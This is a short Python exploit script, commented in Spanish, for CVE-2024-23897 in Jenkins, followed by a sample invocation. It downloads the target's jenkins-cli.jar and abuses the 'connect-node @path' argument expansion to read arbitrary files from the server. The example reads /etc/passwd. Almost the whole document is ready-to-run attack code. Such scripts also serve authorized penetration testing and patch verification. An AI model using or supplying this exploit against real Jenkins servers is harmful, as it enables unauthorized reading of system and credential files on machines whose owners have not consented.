```python
import argparse
import requests
import os
import subprocess

def descargacli(ip, puerto):
    url = f"http://{ip}:{puerto}/jnlpJars/jenkins-cli.jar"
    jenkinscli = "jenkins-cli.jar"
    try:
        respuesta = requests.get(url)
        if respuesta.status_code == 200:
            with open(jenkinscli, 'wb') as jenkinsclibinario:
                jenkinsclibinario.write(respuesta.content)
        else:
            print(f"No se pudo descargar el archivo. Código de estado: {respuesta.status_code}")
            return False
    except requests.RequestException as e:
        print(f"Error al realizar la solicitud: {e}")
        return False
    return True

def payload(ip, puerto, ruta):
    archivo_jar = "jenkins-cli.jar"
    payload = f"java -jar {archivo_jar} -s http://{ip}:{puerto}/ -http connect-node @{ruta}"
    try:
        subprocess.run(payload, shell=True, check=True)
        os.remove("jenkins-cli.jar")
    except subprocess.CalledProcessError as e:
        print(f"Error al conectar el nodo: {e}")

def main():
    parser = argparse.ArgumentParser(description="Script para explotar el CVE-2024-23897 en Jenkins")
    parser.add_argument("ip", type=str, help="Dirección IP del servidor Jenkins")
    parser.add_argument("puerto", type=str, help="Puerto del servidor Jenkins")
    parser.add_argument("ruta", type=str, help="Ruta para leer el archivo")
    args = parser.parse_args()

    ip = args.ip
    puerto = args.puerto
    ruta = args.ruta

    if descargacli(ip, puerto):
        payload(ip, puerto, ruta)

main()
```
python3 CVE-2024-23897.py 172.17.0.2 8080 /etc/passwd